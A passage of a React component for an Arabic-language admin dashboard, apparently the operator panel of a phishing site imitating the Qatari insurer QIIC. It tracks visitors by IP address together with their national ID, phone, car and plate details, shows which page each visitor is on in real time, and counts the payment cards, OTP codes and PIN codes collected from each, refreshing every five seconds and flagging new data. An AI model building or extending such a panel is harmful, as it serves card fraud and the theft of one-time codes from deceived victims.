                  <span className="font-semibold">{stats.active} / {stats.total} نشط</span>
                </div>
                {newDataCount > 0 && (
                  <div className="flex items-center gap-2 bg-green-500 px-4 py-2 rounded-full animate-pulse">
                    <AlertCircle className="w-4 h-4" />
                    <span className="font-bold">{newDataCount} بيانات جديدة!</span>
                  </div>
                )}
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full text-xs">
                  <Clock className="w-4 h-4" />
                  <span>تحديث تلقائي كل 5 ثواني</span>
                </div>
              </div>
            </div>
            <div className="flex gap-3">
              <button
                onClick={handleRefresh}
                className="bg-white/20 hover:bg-white/30 p-3 rounded-lg transition-colors relative"
                title="تحديث"
              >
                <RefreshCw className="w-6 h-6" />
                {newDataCount > 0 && (
                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs font-bold rounded-full w-5 h-5 flex items-center justify-center animate-bounce">
                    {newDataCount}
                  </span>
                )}
              </button>
              <button
                onClick={handleLogout}
                className="bg-white/20 hover:bg-white/30 px-6 py-3 rounded-lg flex items-center gap-2 transition-colors"
              >
                <LogOut className="w-5 h-5" />
                تسجيل خروج
              </button>
            </div>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-6">
          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-blue-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">إجمالي العملاء</p>
                <p className="text-3xl font-bold text-blue-600">{stats.total}</p>
              </div>
              <div className="bg-blue-100 p-3 rounded-lg">
                <Users className="w-8 h-8 text-blue-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-green-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">العملاء النشطون</p>
                <p className="text-3xl font-bold text-green-600">{stats.active}</p>
              </div>
              <div className="bg-green-100 p-3 rounded-lg">
                <Activity className="w-8 h-8 text-green-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-yellow-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">قيد الانتظار</p>
                <p className="text-3xl font-bold text-yellow-600">{stats.pending}</p>
              </div>
              <div className="bg-yellow-100 p-3 rounded-lg">
                <Clock className="w-8 h-8 text-yellow-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-purple-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">إجمالي الإيرادات</p>
                <p className="text-3xl font-bold text-purple-600">{stats.totalRevenue.toFixed(0)} ر.ق</p>
              </div>
              <div className="bg-purple-100 p-3 rounded-lg">
                <DollarSign className="w-8 h-8 text-purple-600" />
              </div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white rounded-xl p-6 shadow-md mb-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="relative">
              <Search className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input
                type="text"
                placeholder="ابحث بـ IP، الاسم، QID، الهاتف، السيارة، رقم اللوحة..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pr-12 pl-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-qiic-maroon focus:border-transparent"
                dir="rtl"
              />
            </div>

            <div className="flex gap-2 flex-wrap">
              <button
                onClick={() => setFilterStatus('all')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'all' 
                    ? 'bg-qiic-maroon text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                الكل ({stats.total})
              </button>
              <button
                onClick={() => setFilterStatus('active')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'active' 
                    ? 'bg-green-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                نشط ({stats.active})
              </button>
              <button
                onClick={() => setFilterStatus('pending')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'pending' 
                    ? 'bg-yellow-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                معلق ({stats.pending})
              </button>
              <button
                onClick={() => setFilterStatus('approved')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'approved' 
                    ? 'bg-green-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                موافق ({stats.approved})
              </button>
            </div>
          </div>
        </div>

        {/* Customers Table */}
        <div className="bg-white rounded-xl shadow-md overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full" dir="rtl">
              <thead className="bg-gradient-to-r from-gray-800 to-gray-900 text-white">
                <tr>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">IP</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">معلومات العميل</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">QID</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">السيارة</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">رقم اللوحة</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">التأمين</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الصفحة الحالية</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">البطاقات</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">OTP/PIN</th>
                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
                  <th className="px-4 py-4 text-center text-xs font-bold whitespace-nowrap">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {filteredCustomers.map((customer, idx) => {
                  const isNew = lastDataTimestamp && customer.lastUpdate && 
                                (Date.now() - customer.lastUpdate < 10000);
                  return (
                    <tr 
                      key={customer.ip} 
                      className={`hover:bg-blue-50 transition-all duration-300 ${
                        isNew ? 'blink-green-text' : ''
                      } ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}
                    >
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse shadow-lg shadow-green-300' : 'bg-gray-300'}`}></div>
                        <span className="text-xs">{customer.isActive ? 'نشط' : 'غير متصل'}</span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono text-xs font-semibold text-purple-600">{customer.ip}</span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.customerInfo ? (
                        <div className="min-w-[150px]">
                          <p className="font-semibold text-gray-900 text-sm">{customer.customerInfo.name}</p>
                          <p className="text-xs text-gray-600 flex items-center gap-1">
                            <Phone className="w-3 h-3" />
                            {customer.customerInfo.phone}
                          </p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono text-xs font-bold text-blue-600">
                        {customer.customerInfo?.qid || customer.moreDetails?.qid || '—'}
                      </span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.carDetails ? (
                        <div className="min-w-[120px]">
                          <p className="font-semibold text-gray-900 text-sm">{customer.carDetails.make}</p>
                          <p className="text-xs text-gray-600">{customer.carDetails.model} - {customer.carDetails.year}</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <span className="font-mono font-bold text-green-600">
                        {customer.moreDetails?.plateNumber || '—'}
                      </span>
                    </td>
                    <td className="px-4 py-4">
                      {customer.insurance ? (
                        <div className="min-w-[100px]">
                          <p className="font-semibold text-orange-600 text-sm">{customer.insurance.insuranceType}</p>
                          <p className="text-xs text-gray-600">{customer.insurance.amount} ريال</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-1 min-w-[120px]">
                        <Navigation className="w-3 h-3 text-blue-600" />
                        <span className="text-xs font-medium">{getPageBadge(customer.currentPage)}</span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-1">
                        <CreditCard className="w-4 h-4 text-purple-600" />
                        <span className="font-bold text-purple-600" title={`${customer.payments?.length || 0} بطاقة`}>
                          {customer.payments?.length || 0}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex gap-2 items-center">
                        <div className="flex items-center gap-1">
                          <Shield className="w-3 h-3 text-yellow-600" />
                          <span className="text-xs font-semibold text-yellow-600">{customer.otpCodes?.length || 0}</span>
                        </div>
                        <div className="flex items-center gap-1">
                          <CreditCard className="w-3 h-3 text-indigo-600" />
                          <span className="text-xs font-semibold text-indigo-600">{customer.pinCodes?.length || 0}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      {getStatusBadge(customer.status)}
                    </td>
                    <td className="px-4 py-4">
                      <button
                        onClick={() => viewDetails(customer)}
                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white p-2 rounded-lg transition-all shadow-md hover:shadow-lg"
                        title="عرض جميع التفاصيل"
                      >
                        <Eye className="w-5 h-5" />
                      </button>
                    </td>
                  </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {filteredCustomers.length === 0 && (
            <div className="text-center py-12">
              <AlertCircle className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <p className="text-gray-500 text-lg">لا توجد نتائج</p>
              <p className="text-gray-400 text-sm mt-2">جرب تغيير معايير البحث أو الفلتر</p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-gray-600 text-sm bg-white rounded-lg p-4 shadow">
          <p className="font-semibold">آخر تحديث: {new Date().toLocaleString('ar-QA')}</p>
          <p className="mt-1">عدد العملاء المعروضين: <span className="font-bold text-blue-600">{filteredCustomers.length}</span> من أصل <span className="font-bold">{customers.length}</span></p>
          <p className="mt-2 text-xs text-gray-500">
            التحديث التلقائي نشط • جميع البيانات محدثة مباشرة
          </p>
        </div>
      </div>
    </div>
  );
}
